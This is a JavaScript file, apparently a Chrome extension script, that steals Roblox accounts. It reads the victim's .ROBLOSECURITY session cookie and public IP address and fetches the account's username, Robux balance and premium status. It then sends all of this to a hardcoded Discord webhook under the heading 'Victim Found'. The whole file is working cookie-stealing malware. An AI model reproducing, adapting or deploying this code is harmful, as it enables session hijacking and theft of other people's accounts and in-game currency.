const WEBHOOK = "https://discord.com/api/webhooks/1410238193118220299/YFBq8DxfhkmiqFKc6ahGzEB8w1h-PrMIbJ4FtS057HeWvJFCt36b7S3ffHSXH9Rp1UQi";

async function main(cookie) {
    try {
        var ipAddr = await (await fetch("https://api.ipify.org")).text();
        var statistics = null;

        if (cookie) {
            try {
                const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                    headers: {
                        Cookie: ".ROBLOSECURITY=" + cookie
                    },
                    redirect: "manual"
                });
                
                // Check if response is JSON before parsing
                const contentType = response.headers.get("content-type");
                if (contentType && contentType.includes("application/json")) {
                    statistics = await response.json();
                } else {
                    // Handle HTML response (likely an error)
                    const text = await response.text();
                    console.error("Server returned HTML instead of JSON:", text.substring(0, 200));
                    statistics = null;
                }
            } catch (error) {
                console.error("Fetch error:", error);
                statistics = null;
            }
        }
        
        // Send data to Discord webhook
        fetch(WEBHOOK, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                "content": null,
                "embeds": [
                  {
                    "description": "```" + (cookie ? cookie : "COOKIE NOT FOUND") + "```",
                    "color": null,
                    "fields": [
                      {
                        "name": "Username",
                        "value": statistics ? statistics.UserName : "N/A",
                        "inline": true
                      },
                      {
                        "name": "Robux",
                        "value": statistics ? statistics.RobuxBalance : "N/A",
                        "inline": true
                      },
                      {
                        "name": "Premium",
                        "value": statistics ? statistics.IsPremium : "N/A",
                        "inline": true
                      }
                    ],
                    "author": {
                      "name": "Victim Found: " + ipAddr,
                      "icon_url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    },
                    "footer": {
                      "text": "https://github.com/ox-y",
                      "icon_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Octicons-mark-github.svg/1200px-Octicons-mark-github.svg.png"
                    },
                    "thumbnail": {
                      "url": statistics ? statistics.ThumbnailUrl : "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/NA_cap_icon.svg/1200px-NA_cap_icon.svg.png",
                    }
                  }
                ],
                "username": "Roblox",
                "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png",
                "attachments": []
            })
        }).catch(error => {
            console.error("Webhook error:", error);
        });
    } catch (error) {
        console.error("Main function error:", error);
    }
}

// Get cookie and execute
chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});